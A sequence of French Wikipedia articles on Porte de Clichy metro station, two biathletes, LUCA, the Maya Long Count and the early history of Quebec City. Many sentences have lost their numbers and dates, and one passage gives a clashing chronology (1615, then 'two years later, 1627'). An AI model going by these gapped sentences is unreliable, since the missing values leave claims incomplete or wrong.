À partir de 1952, l'extension de la branche nord-est de "Porte de Saint-Ouen" jusqu'à "Carrefour Pleyel" provoque un important déséquilibre de trafic en faveur de celle-ci. "Porte de Clichy" n'est donc plus desservie que par une rame sur trois.
Elle devient finalement une station de passage le à la suite de la mise en service du prolongement jusqu'à "Gabriel Péri — Asnières — Gennevilliers" (aujourd'hui "Gabriel Péri"), entraînant le retour d'une fréquence équivalente sur chaque branche. La boucle est conservée comme position de garage et sert occasionnellement pour des terminus partiels. Elle est finalement neutralisée lors de la construction de la ligne 14 et n'est aujourd'hui plus exploitée.
Une des variantes du tracé du prolongement du RER E à l'ouest aurait aussi desservi la station, mais ce tracé a été exclu en au profit de celui passant par la porte Maillot.
Au début de l'année 2018, le sous-titre Tribunal de Paris est apparu sur le plan de la ligne ainsi que sur les quais, à la suite de l'inauguration de la nouvelle Cité judiciaire de Paris datant de .
En 2019, sont entrés à cette station ce qui la place à la des stations de métro pour sa fréquentation.
En 2020, avec la crise du Covid-19, sont entrés dans cette station ce qui la place à la des stations de métro pour sa fréquentation.
Le , les quais de la sont ouverts au public après les travaux de finition qui n'avaient pas pu être achevés à temps à l'occasion du prolongement de cette ligne, intervenu le jusqu'à "Mairie de Saint-Ouen".
En 2021, la fréquentation remonte progressivement, avec qui sont entrés dans cette station ce qui la place à la des stations de métro pour sa fréquentation.
Services aux voyageurs.
Accès.
La station dispose de huit accès :
En décembre 2023, quatre fresques de l'artiste Julian Opie, sont disposées dans la salle d'échange située au dessus des quais de la ligne 14.
Quais.
Ligne 13.
Porte de Clichy est une station de configuration particulière : elle est constituée de deux demi-stations non parallèles, longues de , situées sur l'ancienne boucle de retournement et comprenant chacune une voie à quai latéral sous une voûte elliptique.
Elle a conservé sa décoration caractéristique du Nord-Sud d'origine avec des cadres publicitaires et entourages du nom de la station en céramique de couleur verte (teinte utilisée pour les terminus et les stations de correspondance) ainsi que la dénomination incorporée dans la faïence en blanc sur fond bleu de très grande taille entre les cadres publicitaires, uniquement sur le piédroit du côté du quai. Le nom de la station est également inscrit en police de caractère Parisine sur des plaques émaillées côté voie. Il n'y a pas de dessins géométriques sur la voûte et les piédroits, ni de directions écrites sur la céramique des tympans, qui sont tous recouverts de carreaux de faïence blancs biseautés.
Ce style est combiné depuis les années 1980 à un aménagement de style « Andreu-Motte » avec une rampe lumineuse orange par demi-station, ainsi qu'une banquette en carrelage orange plat munie de sièges « Motte » de même couleur. La station est donc, avec "Pasteur" et "Porte de Versailles" sur la , l'une des trois du réseau à mêler la décoration « Andreu-Motte » à la céramique traditionnelle du style « Nord-Sud ».
Ligne 14.
La station de la ligne 14 est parallèle à l’avenue de la Porte-de-Clichy, localisée sous des constructions de la ZAC Clichy-Batignolles. L’accès principal à la station se fait à l’angle de l’avenue de la Porte-de-Clichy et du boulevard Bessières. Deux accès secondaires sont implantés, l'un sur le parvis de la Cité judiciaire de Paris, à l’angle de l’avenue de la Porte-de-Clichy et de la rue André-Suarès et l'autre à l’angle du boulevard Berthier et de l’avenue de la Porte-de-Clichy, pour assurer la correspondance avec le tramway de la ligne T3b. Sa réalisation est l'œuvre du groupement Eiffage TP/Razel-Bec.
La station est construite sur sept niveaux. Elle a une surface au plancher de , une longueur de et une largeur de . Ses quais sont situés à une profondeur de .
Intermodalité.
La station est en correspondance avec la gare de la ligne C du RER, branche de Pontoise. Elle est desservie par les lignes 28, 54, 163 et 173 du réseau de bus RATP et par la ligne 74 du réseau de bus Boucles Nord de Seine. La station est également desservie par la ligne T3b du tramway (depuis le ) et, la nuit, par les lignes N15 et N51 du réseau de bus Noctilien.

</doc>
<doc id="568417" url="https://fr.wikipedia.org/wiki?curid=568417" title="Oleg Ryjenkov">
Oleg Ryjenkov

Oleg Ryzhenkov (en , "Aleg Ouladzimiravitch Ryjenkaw"; en , "Oleg Vladimirovitch Ryjenkov") né le en RSSA de Carélie (Union soviétique), est un biathlète biélorusse notamment trois fois champion du monde dans des épreuves collectives.
Biographie.
Il s'est marié avec une autre biathlète de haut niveau, Nataliya Ryzhenkova. Il se marie plus tard avec la biathlète Delphyne Burlet, avec qui il a un fils comme avec sa première femme. Il divorce de nouveau et se marie une troisième fois.
Le biathlète biélorusse fait ses débuts internationaux en Coupe du monde lors de la saison 1992-1993, juste après l'indépendance de son pays et y monte sur un podium à sa deuxième course, le sprint de Pokljuka. Il gagne un relais à Bad Gastein la saison suivante, puis sa première course individuelle en 1995, à l'occasion du sprint de Ruhpolding. Juste après, aux Championnats du monde d'Antholz, il décroche deux médailles de bronze, sur l'individuel et le relais. Pour son retour sur la Coupe du monde, il gagne le sprint de Lahti, pour finir cinquième du classement général. En 1996, il obtient de moins bons résultats individuels, mais gagne une médaille de bronze en relais et une médaille d'or par équipes aux Championnats du monde. Par contre l'édition 1997 est un succès personnel pour lui, puisqu'il remporte son deuxième titre sur la course par équipes avec Petr Ivashko, Aleksandr Popov et Vadim Sachourine, une médaille de bronze en sprint et une médaille d'argent sur l'individuel. 
Aux Jeux olympiques d'hiver de 1994 et 1998, il se place quatrième du relais. En 1998, il est notamment neuvième de l'individuel, son meilleur résultat dans des Jeux.
En 1999, il signe son troisième succès en Coupe du monde sur l'individuel d'Hochfilzen, puis devient champion du monde de relais.
En 2001, il est vice-champion du monde de relais. Aux Jeux olympiques d'hiver de 2002, il se classe notamment onzième du sprint. En , il renoue avec le podium après plus de trois ans de disette en terminant troisième du sprint d'Östersund. Il est huitième du classement général de la Coupe du monde cet hiver et est médaillé de bronze en relais aux Championnats du monde à Khanty-Mansiïsk.
Il obtient son dernier podium individuel (son treizième) en 2005 au sprint de Khanty-Mansiïsk. En 2006, il participe à ses quatrièmes Jeux olympiques à Turin, puis peu après un titre européen en relais, il prend sa retraite sportive.
Après sa carrière sportive, il devient entraîneur et est responsable notamment de l'équipe biélorusse.

</doc>
<doc id="568420" url="https://fr.wikipedia.org/wiki?curid=568420" title="24h chrono">
24h chrono



</doc>
<doc id="568429" url="https://fr.wikipedia.org/wiki?curid=568429" title="Dernier ancêtre commun universel">
Dernier ancêtre commun universel

Le dernier ancêtre commun universel (LUCA, pour l'anglais "last universal common ancestor") est le dernier ancêtre commun à toutes les espèces vivant actuellement sur Terre.
LUCA n'est pas le premier organisme vivant mais l'organisme (ou le groupe d'organismes) précédant la séparation des grands domaines actuels. Il s'agit d'un organisme déjà assez complexe, issu d'une longue évolution, guidée par la sélection naturelle.
Ses caractéristiques ne sont pas certaines, mais on estime que LUCA aurait vécu il y a environ d'années dans un environnement mésophile au voisinage de sources hydrothermales alcalines. Il s'agit probablement d'une cellule procaryote (sans noyau) simple, dont le génome constitué d'ARN codait . Son métabolisme utilisait des réactions d'oxydoréduction pour produire de l'énergie. Les ribosomes existaient probablement déjà dans LUCA, et sa membrane cellulaire, composée de terpénoïdes, était plus simple que celle des cellules actuelles.
Approches méthodologiques.
Définir et caractériser un organisme très ancien, dont on n'a aucun fossile, nécessite d'utiliser une approche méthodologique précise.
Approche généalogique.
Théorie.
L'hypothèse conduisant à ce concept de LUCA est que tous les êtres vivants sont issus d'une même lignée divergente d'ancêtres communs, remontant jusqu'à l'époque où la seule reproduction était la division cellulaire. Cela implique l'existence dans le passé lointain d'une cellule telle que :
LUCA ne doit pas être confondu avec le premier organisme vivant, ni avec l'ancêtre le plus récent de toutes les formes de vie ayant jamais vécu sur Terre (y compris celles aujourd'hui disparues). La complexité des ARN et des protéines qu'il comportait implique qu'il était lui-même issu d'une lignée évolutive plus ancienne, et qu'il cohabitait probablement avec bien d'autres formes de vie qui n'ont pas laissé de descendants actuels.
Désignations.
Carl Woese avait proposé en 1977 le terme progénote pour désigner un organisme vivant primitif cherchant à acquérir une maîtrise de son phénotype par son génome et qui serait l'ancêtre de l'ensemble du vivant. LUCA serait d'après lui le dernier progénote avant la ramification du vivant tel que nous le connaissons.
Le terme anglais , formé d'après le grec et , a été suggéré par Fitch et Upper en 1987.
La dénomination LUCA a été suggérée en 1994 par Christos Ouzounis et Nikos Kyrpides. Elle a été popularisée par un séminaire de 1996 organisé par Patrick Forterre et la fondation des Treilles. Le CNRS avance un éventuel clin d'œil envers Lucy, australopithèque découverte en 1974, que les sources anglo-saxonnes ne reprennent pas .
Richard Dawkins utilise le terme "concestor" (mot-valise pour "", « ancêtre commun »), forgé par Nicky Warren. Gustavo Caetano-Anollés l'appelle "urancestor" (ancêtre absolu).
Cas des virus.
Dans cette approche supportée par la généalogie cellulaire, les virus ne sont pas inclus parmi les êtres vivants. Le problème de leur phylogénie se pose bien, mais l'origine commune des virus ne peut pas être mise en évidence par la comparaison de leurs séquences nucléotidiques, et pour l'instant aucune classification des virus ne prétend être phylogénétique.
En revanche, les virus ont joué un rôle significatif dans l'évolution du vivant en effectuant des transferts de gène. Il est vraisemblable qu'archées et bactéries aient acquis une partie de leur ADN grâce aux virus.
Phylogénie des premiers groupes du vivant.
LUCA se serait subdivisé en deux cellules filles à l'origine des deux premières lignées ayant encore des descendants aujourd'hui.
Les trois grandes lignées du vivant sont les bactéries, les archées (toutes deux constituées d'organismes monocellulaires à cellule sans noyau, dits procaryotes) et les eucaryotes (organismes mono- ou pluricellulaires dont la ou les cellules disposent d'un noyau, et dont font en particulier partie les plantes, les champignons et les animaux).
Ces trois lignées ont en commun 3 molécules d'ARN et 34 protéines présentes dans le ribosome. Cet ensemble de molécules et protéines est trop complexe pour avoir été acquis indépendamment par des organismes aussi éloignés que les bactéries, les archées et les eucaryotes.
En plus de ces 34 protéines universelles, les ribosomes modernes renferment de nombreuses autres protéines qui sont communes, soit à l'un des trois domaines du vivant, soit aux archées et aux eucaryotes.
Le problème de la phylogénie des origines est de déterminer quelle a été la première bifurcation, c'est-à-dire quelles sont parmi les lignées des bactéries, des archées ou des eucaryotes les deux premières à avoir divergé du tronc commun ancestral menant à LUCA.
Les études actuelles considèrent que les bactéries et les archées constituent les deux premières branches de l'arbre de la vie, les eucaryotes ont émergé parmi les archées d'Asgård par endosymbioses, une avec une α-protéobactérie devenue la mitochondrie et un processus encore mal compris pour le noyau.
Autres hypothèses.
Des études minoritaires concluaient différemment.
Certains considéraient que les néomures (le clade incluant les archées et les eucaryotes) prennent naissance parmi les bactéries (qui formeraient alors un groupe paraphylétique), dans l’embranchement des Firmicutes.
D'autres considéraient que l'embranchement des Chloroflexiota serait le groupe frère d'un clade regroupant les Archées, les Eucaryotes, et le reste des Bactéries, comme proposé par Thomas Cavalier-Smith.
Selon d'autres auteurs, LUCA aurait été eucaryote, et aurait ensuite donné naissance à une lignée de bactéries et d'archées par simplification évolutive.
Approche moderne.
Le concept initial de LUCA se base sur des hypothèses faisant abstraction des phénomènes de conjugaison, d'endocytose ou de transfert génétique, qui mettent en jeu deux cellules. Par exemple, le noyau des cellules des eucaryotes pourrait avoir une ascendance distincte de celle de son cytoplasme. De fait, en reproduction sexuée, le noyau a une ascendance distincte de son protoplasme, le premier venant par moitié de chacun des parents, le second venant souvent exclusivement de la mère, notamment pour ce qui est des mitochondries, et des chloroplastes dans le cas des végétaux.
Plus récemment, au , LUCA est plutôt envisagé comme une population de protocellules, capable d'échanger massivement des gènes, et qui a en fin de compte donné naissance aux deux domaines procaryotes que sont les archées et les bactéries.
Antérieurement à ces séparations, la population LUCA réalisait un brassage génétique suffisant pour qu'un composant génétique définissant un système métabolique cohérent puisse être potentiellement diffusé dans l'ensemble de la biosphère. De ce point de vue, la population microbienne représentait une collection d'individus interféconds, donc une « espèce » unique. Cette population n'était pas nécessairement homogène, la prévalence de tel ou tel métabolisme dépendant des conditions écologiques. En particulier, la conservation d'un système de photosynthèse ne confère un avantage reproductif que dans des milieux éclairés.
L'analyse des domaines de protéines et des familles et superfamilles de configurations permet de retracer l'évolution des différentes cellules en parallèle à celle des virus. L'analyse de l'horloge moléculaire associée à ces protéines suggère que la première séparation a été celle entre les virus et les microbes, il y a , suivie de celle entre archées et bactéries, il y a Par rapport à l'histoire de la Terre, la première séparation correspond à l'invention de la photosynthèse, la seconde renvoie probablement à l'origine de la nitrogénase.
Description.
L'existence de LUCA n'est pas prouvée par des fossiles, mais est présumée par l'analyse des lignées génétiques du vivant. Les caractères de LUCA sont déduits de ceux partagés par ses descendants. Les travaux en biologie de l'évolution permettent de décrire avec de plus en plus de précision l'histoire des êtres vivants, et notamment comment sont apparues les caractéristiques partagées ou non par les grands domaines du vivant.
D'après Patrick Forterre, LUCA est , issue d'une longue évolution à partir d'anciennes cellules présentant un métabolisme et capables de se reproduire.
Elle avait une membrane constituée de terpénoïdes, plus simple que celles des cellules actuelles.
Environnement de vie.
Ce n'était probablement pas un organisme libre mais confiné dans les micropores de cheminées hydrothermales alcalines.
D’après les travaux menés par Manolo Gouy, LUCA n'est vraisemblablement pas hyperthermophile car son ARN ribosomal ne présente pas le renforcement en paires G-C typique de ces organismes. Il serait plutôt mésophile (20 à 60 °C). Certaines bactéries et archées se sont développées postérieurement dans un biotope très chaud, devenant hyperthermophiles (ce qui requérait l'existence de l'ADN, plus stable que l'ARN à ces températures). Ce contexte a pu favoriser « les ressemblances superficielles que l'on observe entre les archées et les bactéries, ce que l'on peut appeler le « phénotype » procaryote ».
Datation.
Une étude de 2024 réévalue l'âge potentiel de LUCA. L'équipe identifie codant des protéines qui trouveraient leur origine chez cet ancêtre commun, prouvant ainsi qu'il disposait déjà d’outils relativement sophistiqués pour assurer son métabolisme et sa reproduction. 59 marqueurs génétiques sont retenus pour établir une phylogénie à l'intérieur des deux domaines primaires (Bactéries et Archées). En appliquant une méthode de réconciliation phylogénétique, des arbres ont pu être établis avec des modèles de substitution complexes. L'application de méthodes de datation moléculaire permet de remonter à un âge de 4,2 milliards d'années, nettement antérieur aux évaluations précédentes. À cette époque, l'environnement terrestre était particulièrement hostile, mais la vie a pu se développer au voisinage de sources hydrothermales.
Génome.
LUCA et un génome à ARN. Outre les trois gros ARN universels (16S, 23S et 5S), son ribosome se composait d'une trentaine de protéines (contre 60 à 80 pour ses descendants modernes). On pense que l'ADN a été introduit ultérieurement et indépendamment, dans la lignée bactérienne et celle conduisant aux archées et aux eucaryotes, car les protéines qui le répliquent sont différentes dans ces deux lignées. Les 33 protéines ribosomales caractéristiques des archées et des eucaryotes sont remplacées par 23 autres très différentes chez les bactéries. Elles ont vraisemblablement été ajoutées au ribosome de ces organismes par des virus après la divergence des deux lignées.
Métabolisme.
Son métabolisme est basé sur des réactions d'oxydoréduction. L’hydrogène de l’eau, réduit par le Fe2+ pouvait être utilisé pour fixer le CO2. Elle ne disposait pas d'enzyme lui permettant de se nourrir de matière organique préexistante.
En revanche, elle dispose de nombreux enzymes intervenant dans le métabolisme des nucléotides et un ribosome primordial permettant la synthèse de protéines mais de façon encore peu fiable.
LUCA était également complexe en termes de structure cellulaire. On pense qu’il disposait d'organelles analogues aux acidocalcisomes pour stocker l'énergie. Ces structures cellulaires devaient accumuler des composés tels que les polyphosphates stockant l’énergie dans leurs liaisons phosphoanhydrides. Ces composés énergétiques étaient nécessaires aux thioesters et pyrophosphates permettant le transport de l'énergie du milieu ambiant au profit du métabolisme de ce progénote.
Une étude publiée en 2016 par William Martin, analysant de gènes codant des protéines issus du séquencement du génome de nombreux procaryotes ( bactériens et 134 génomes d'archées), a permis d’identifier qui sont vraisemblablement partagés avec LUCA, parmi les étudiés. Ceci permet de décrire LUCA comme un organisme autotrophe, anaérobie, thermophile, dépendant du dihydrogène et du gaz carbonique avec une voie réductrice de l'acétyl-coenzyme A et pouvant fixer le diazote. LUCA utilisait un couplage chimio-osmotique de part et d'autre de sa membrane cellulaire pour produire de l'ATP grâce à une enzyme de type ATP synthase. La présence d’enzyme ADN gyrase inverse dans le génome théorique de LUCA, enzyme spécifique des organismes thermophiles, permet de supposer que LUCA s'est développé près de cheminées hydrothermales, un environnement anaérobie et riche en , et fer. Cette étude a également permis de mettre en évidence la présence de gènes codant la S-adénosylméthionine, indiquant que LUCA effectuait des modifications chimiques de nucléosides à la fois dans son ARNt et son ARNr. L’étude de William Martin avance l’hypothèse que LUCA était dépendant de la synthèse abiotique et spontanée de méthane à partir de et de présents dans les cheminées hydrothermales de son environnement, et insiste sur l'importance des groupements méthyle dans le développement du métabolisme de LUCA. Cette étude suggère également que les organismes méthanogènes et les clostridia acétogéniques sont les plus proches parents actuels de LUCA.

</doc>
<doc id="568430" url="https://fr.wikipedia.org/wiki?curid=568430" title="Compte long">
Compte long

Le compte long est un système de datation antique caractéristique de la civilisation maya de l'époque classique et dont l’usage omniprésent la distingue de toutes les autres civilisations mésoaméricaines. Comme les autres civilisations de la Mésoamérique, les Mayas connaissaient deux types de calendrier : le calendrier Tzolk'in, un calendrier rituel de , et le calendrier haab, un calendrier solaire composé de . Ils employaient couramment un troisième type de datation extrêmement précis : le compte long dont le point de départ correspond à la création du monde actuel le , dans la mythologie maya. Selon la corrélation GMT de Thompson de 1950, cette date correspondrait au jour julien , soit, en calendrier grégorien sans année zéro, au .
Origines.
Les premières inscriptions en compte long ont été découvertes en dehors de l’ère maya, dans la région de l’isthme de Tehuantepec. Citons la célèbre de Tres Zapotes, dont la date correspondrait à l'an -31, du moins si le point de départ du calendrier local correspond effectivement à celui de la corrélation GMT (voir ci-dessous).
Unités.
Les Mayas employaient un système vigésimal, c’est-à-dire en , associé à des unités explicites et, en général, limité à 5 places :
Le système se prolonge au delà du "baktun" avec le "pictun" ( ou ), le "kalabtun" ( ou ), le "kinchiltun" ( ou ), l"'alautun" ( soit ou « années » de ).
Notation.
C’est la notation dite du « compte long » ou, selon une terminologie plus ancienne que l’on doit à Alfred Maudslay, des « séries initiales » (parce que la plupart des inscriptions maya de l’époque classique débutaient par ce type de date).
Sur une stèle, une date en compte long apparaît de la manière suivante, dans l'ordre :
Pour indiquer qu’un ordre d’unité est vide, les Mayas utilisaient un glyphe ayant la forme d’une coquille, soit l’équivalent de notre zéro. Par exemple, lorsqu’un mayaniste note une date de la façon suivante : 9.17.0.0.0, il faut comprendre que , , , et se sont écoulés depuis ce point zéro.
Les Mayas croyaient à l’existence de « grands cycles » de (), c’est-à-dire approximativement solaires. Selon les conceptions cosmogoniques que les Mayas partageaient avec les autres civilisations mésoaméricaines, il y a une suite vraisemblablement ouverte de créations. L’univers actuel aurait été « créé » en . La date exacte en compte long est , , que l’on trouve sur la de Quiriguá.
Une autre référence au mois d’ se trouve sur la de Tikal. D’après la de la référence : Les théories relatives à la « fin du monde » le partent donc d’une conception erronée du calendrier maya car il ne peut évidemment s’agir que de la fin d’un monde, c’est-à-dire du supercycle de ( environ) commencé en avant notre ère. D’après , ce supercycle se terminerait le , tandis que selon et , ce serait plutôt le .
Ce système typique de l’Époque classique disparaît des stèles et des monuments au . La dernière date connue de fin de "baktun" en compte long gravée sur un monument provient du site de Toniná : 10.4.0.0.0, c’est-à-dire . À l’Époque postclassique, il ne subsistait plus sur les monuments qu’un système simplifié de « compte court » composé de périodes de , c’est-à-dire .
Corrélation GMT.
Pour faire correspondre une date en compte long à une date de notre calendrier, on se fonde sur des événements de l'époque de la colonisation espagnole () attestés à la fois en « compte court » et en calendrier julien, par exemple la fondation de la ville de Mérida (Mexique) le :
 Ensuite on établit une corrélation entre le compte court et le compte long de l’époque classique. Il existe plusieurs systèmes de corrélation et la plupart des spécialistes suivent la corrélation GMT. Il suffit alors de faire la conversion en calendrier julien et puis en calendrier grégorien. Des datations au de linteaux en bois datés retrouvés à Tikal supportent la validité du .

</doc>
<doc id="568431" url="https://fr.wikipedia.org/wiki?curid=568431" title="Galina Koukleva">
Galina Koukleva

Galina Alekseïvna Koukleva (en russe : Галина Алексеевна Куклева), née le à Ichimbaï (Bachkirie), est une biathlète russe. Elle est championne olympique du sprint en 1998. Elle a remporté aussi huit autres épreuves de Coupe du monde entre 1995 et 2003, sa dernière année dans l'élite.
Biographie.
En 1990, elle est championne du monde junior.
Pour sa première saison complète en Coupe du monde en 1994-1995, elle signe son premier podium individuel à Lahti, puis juste après sa première victoire au sprint de Lahti. Aux Championnats du monde 1997, elle monte sur son premier podium dans la compétition avec la médaille de bronze au relais.
Aux Jeux olympiques d'hiver de 1998, à Nagano, elle remporte le titre olympique du sprint, sa plus grande récompense internationale, avec seulement sept dixièmes de seconde d'avance sur Uschi Disl. Ce titre couronne sa meilleure année individuellement, après deux courses à Lillehammer en début de saison. Sur le relais, elle obtient la médaille d'argent avec Olga Melnik, Albina Akhatova et Olga Romasko. 
En 2000, elle effectue une autre saison avec des succès au rendez-vous, puisque après deux victoires en Coupe du monde, elle devient vice-championne du monde de la mass start derrière Liv Grete Skjelbreid et championne du monde de relais.
Aux Jeux olympiques d'hiver de 2002, elle complète sa collection de médailles avec le bronze sur le relais. Individuellement, elle est cinquième et sixième sur le sprint et la poursuite.
Après son troisième titre de championne du monde du relais obtenu en 2003, elle prend sa retraite sportive.Au cours de cette dernière saison elle obtient deux succès en sprint à Osrblie et Ruhpolding, portant son total en Coupe du monde à neuf victoires.

</doc>
<doc id="568432" url="https://fr.wikipedia.org/wiki?curid=568432" title="Histoire de la ville de Québec">
Histoire de la ville de Québec

L'histoire de Québec est celle de la ville la plus ancienne du Canada. Située à la confluence du fleuve Saint-Laurent et de la rivière Saint-Charles, elle est fréquentée par les Premières Nations bien avant l’arrivée des colonisateurs européens. Elle a déjà été la capitale canadienne avant de devenir celle de la province de Québec. Elle est connue pour sa topographie particulière avec le cap Diamant qui surplombe la basse-ville. Ville d’histoire, son patrimoine est classé et protégé par différents paliers de gouvernement et organismes internationaux.
Fondation et les.
À l'aube du , le site actuel de la ville de Québec n'était alors plus visité que par des nomades algonquins qui lui donnent son nom, Québec signifiant «l'endroit où la rivière se rétrécit». Le lieu est propice à l'établissement d'une colonie permanente. Comme Samuel de Champlain le dit dans ses "Voyages" en 1613:
«De l’isle d’Orléans jusques a Quebecq y a une lieue, j’y arrivay le 3 Juillet: où estant, je cherchay lieu propre pour nostre habitation, mais je n’en peu trouver de plus commode, ny mieux situé que la pointe de Quebec, ainsi appelé des sauvages, laquelle estoit remplie de noyers. Aussitost j’emploiay une partie de nos ouvriers à les abatre pour faire nostre habitation.»
La ville de Québec a été fondée par Samuel de Champlain le 3 juillet 1608, sous l'aile de Pierre Du Gua de Monts, sur un site situé à proximité d'un ancien village iroquoien appelé Stadaconé où les habitants cultivaient le maïs et profitaient des ressources maritimes du secteur. Il s'agit du berceau de la francophonie en Amérique du Nord et se développera autour de la place Royale.
Le choix de Québec n’est pas anodin. Champlain y voit le potentiel pour le commerce des fourrures, mais aussi pour l’agriculture. De plus, la topographie du terrain représente un avantage défensif non négligeable. Les premiers temps à Québec sont difficiles. Lors de l’hivernement de 1608, près d’une trentaine d’hommes meurent alors que ceux qui restent sont victimes du scorbut.Tranquillement, on s’enracine. On construit l’Habitation en 1608 et la colonisation permanente débute non sans difficulté, l’hiver canadien en rebutant plusieurs. Les Récollets traversent l’océan Atlantique en 1615 avec comme mission d’évangéliser les populations autochtones locales. Deux ans plus tard, en 1627, c’est au tour de Louis Hébert, de Marie Rollet et de leurs trois enfants d’émigrer au Canada et de s’installer à Québec. La famille obtiendra l’une des premières terres en seigneurie et fief de la région. Cette terre, située en haute-ville, témoigne du passé foncièrement agricole de ce secteur. Effectivement, les entrepôts, les quais, les boutiques et les magasins rythmeront le paysage de la basse-ville au bord du fleuve Saint-Laurent et de la rivière Saint-Charles.
La colonisation française est stoppée en 1629 alors que les frères Thomas et Lewis Kirke prennent Québec, mais reprendra dès 1632, lorsque la colonie est rétrocédée à la France, avec davantage de vigueur et de constance. Au milieu des années 1630. Au cours des , la population augmente. En 1663, elle est de quelque 550 habitants qui demeurent dans environ 70 maisons. Dans l’arrière-pays, on compte 1400 personnes qui occupent des fonctions essentiellement agricoles, même si elles fréquentent Québec. À la fin du Régime français, on compte 8000 personnes à Québec. C’est au gouverneur Charles Huault de Montmagny que l’on doit l’aménagement urbanistique de la haute-ville qui deviendra un pôle administratif, religieux et militaire fort. Quant à la basse-ville, elle est connue pour ses activités liées au commerce et au monde ouvrier. Les premières voies routières sont tracées et ouvertes, Québec passe de la colonie comptoir à la ville organisée.
Dans la nuit du 4 au 5 août 1682, un vaste incendie détruit une cinquantaine de bâtiments. À la fin du , les habitants de Québec voient sortir de terre des édifices d’envergure comme la cathédrale, l’Hôtel-Dieu ou encore le Séminaire. On voit aussi s’ériger les premières fortifications de la ville. C’est aussi à cette époque que la première brasserie du Canada entre en service. La Brasserie du Roy est l’idée de Jean Talon, intendant, qui la met en chantier en 1668. Elle entre en opération trois ans plus tard, en 1670. Située au pied de la falaise près de l’Hôtel-Dieu et à proximité de la rivière Saint-Charles, elle n’est en activité que quelques années cessant le brassage en 1675. À la fin du Régime français, le territoire de l'actuelle ville de Québec forme un paysage de contrastes saisissants. Boisés, villages, champs en culture et pâturages entourent la ville. Celle-ci se démarque par son architecture monumentale, ses fortifications (uniques en Amérique du Nord), ses rues boueuses et insalubres, ses riches maisons de maçonnerie et ses bicoques des faubourgs Saint-Jean et Saint-Roch, les premiers à se développer lorsque le centre de Québec se densifie. Malgré son urbanité et son statut de capitale, Québec reste une petite ville coloniale liée étroitement à l'arrière-pays. En effet, les habitants de son hinterland viennent s'y procurer des marchandises de France et vendre leurs surplus agricoles ainsi que du bois de chauffage aux deux marchés de la ville.
Même si le commerce des fourrures est présent à Québec, il ne prendra pas les mêmes proportions qu’à Montréal dont c’est l’activité économique principale. Ce qui sert Québec, c’est sa position géographique à proximité de deux voies navigables non négligeables que sont le fleuve Saint-Laurent et la rivière Saint-Charles. Cela permet à une économie portuaire de prendre racine et de fleurir.
Pour des usages domestiques et commerciaux, on pratique le commerce du bois. La construction navale jouera également un rôle de premier plan pendant plusieurs décennies et occupera des centaines d’ouvriers saisonniers. Entre 1720 et 1740, ce sont 200 navires qui sont construits en rade de Québec. Au cours des , Québec demeure le centre financier et décisionnel de la Nouvelle-France.
La guerre de la Conquête et la guerre de Sept Ans.
"Voir les articles principaux : la guerre de la Conquête et la guerre de Sept Ans."
La topographie de Québec lui confère une certaine défense naturelle. Il faut être en mesure d’escalader la pente escarpée du cap Diamant pour s’emparer de la haute-ville. Comme la ville est la porte d’entrée de la Nouvelle-France sur le continent nord-américain, celui qui prend Québec, prend la colonie.
En juin 1759, une imposante flotte britannique, qui servait sous les ordres du général James Wolfe, au détriment de l'armée française dirigée par le général Louis-Joseph de Montcalm dans le cadre de la guerre de Sept Ans, jette l'ancre près de Québec. Tout le territoire est en état d'alerte. La côte de Beauport, où les Français attendent un débarquement, est fortifiée. Comme le marquis de Montcalm semble vouloir rester sur ses positions à cet endroit, le général Wolfe décide de bombarder la ville afin de briser le moral des troupes françaises.
Le soir du , le bombardement commence de façon très intense et rend la vie difficile aux habitants de la ville.
À la suite d'une victoire française sur la rive droite de la Montmorency, le commandant des forces britanniques, James Wolfe, tente le tout pour le tout : le 13 septembre, ses troupes débarquent à l'Anse-au-Foulon. Elles escaladent la falaise, occupent les hauteurs des plaines d'Abraham et remportent une victoire décisive sur l'armée française. Le 17 septembre, la capitale de la Nouvelle-France capitule. Nicolas Roch de Ramezay remet Québec au général George Townshend qui a pris le relais à la suite du décès de Wolfe. Deux mois de bombardement ont laissé le centre-ville dévasté (près de 80 % de la ville est en ruine).
Régime britannique et le XIXe siècle.
En avril 1760, le maréchal de Lévis remporte la bataille de Sainte-Foy. Cependant, l'arrivée de renforts britanniques oblige l'armée française à se replier sur Montréal qui capitule à son tour, en septembre 1760. Trois ans plus tard, la plupart des possessions françaises d'Amérique du Nord sont cédées à la Grande-Bretagne. Le changement de régime n’affecte pas le rôle de Québec qui demeure une ville de garnison ainsi que le centre administratif de la colonie.
La gouvernance britannique apporte avec elle des changements à Québec. C’est le cas, par exemple, du service des postes qui est mis en place. En effet, au cours du Régime français, la poste était livrée grâce à un système informel bien que la correspondance officielle fût davantage encadrée. Avec le Régime britannique, un système officiel est mis en place et le premier bureau de poste ouvre à Québec en 1763. Cela est notamment rendu possible en raison du développement du réseau routier sous la supervision du Grand Voyer, responsable de la voirie.
La diète des habitants sera aussi influencée par le pouvoir britannique. Si le pain de blé est l’aliment principal de l’alimentation au cours du Régime français, l’introduction de la pomme de terre change la donne. Différents alcools comme la bière, le porto et le sherry sont importés tout comme certains fromages typiquement britanniques comme ceux du Cheshire et de la région de Gloucester. La culture du café, lieu de sociabilité par excellence, prend sa place alors que Pierre Hévé ouvre le premier café de Québec, rue Saint-Pierre.
Néanmoins, certaines choses perdurent dans le temps, comme le commerce du bois et la construction navale. Entre 1608 et 1799, ce sont 5400 navires qui sont construits à Québec. Si le rythme varie dans le temps au gré des événements qui influencent l’économie, la moyenne s’établit à 31 bateaux par année. Au tournant du , le nombre de quais passe de 11 en 1785 à plus de 20 en 1804. L’espace maritime empiète de plus en plus sur le résidentiel. La solution pour pallier ceci est d’aller vers le fleuve dont on comble artificiellement certaines parties du lit. De cette façon, on parvient à doubler la superficie portuaire. C’est d’ailleurs à Québec qu’est construit le "Columbus" en 1824. Navire de 3700 tonneaux, il est la plus grosse embarcation en bois au monde à l’époque. En 1833, un autre événement maritime d’importance se déroule à Québec, le voyage du premier transatlantique à vapeur, le "Royal William". Bien que les turbines soient montréalaises, la construction se fait à Québec par Black et Campbell. Le bateau quitte Pictou (Nouvelle-Écosse) le 18 août 1833 et la traversée jusqu’à Gravesend (Angleterre) prendra 25 jours.
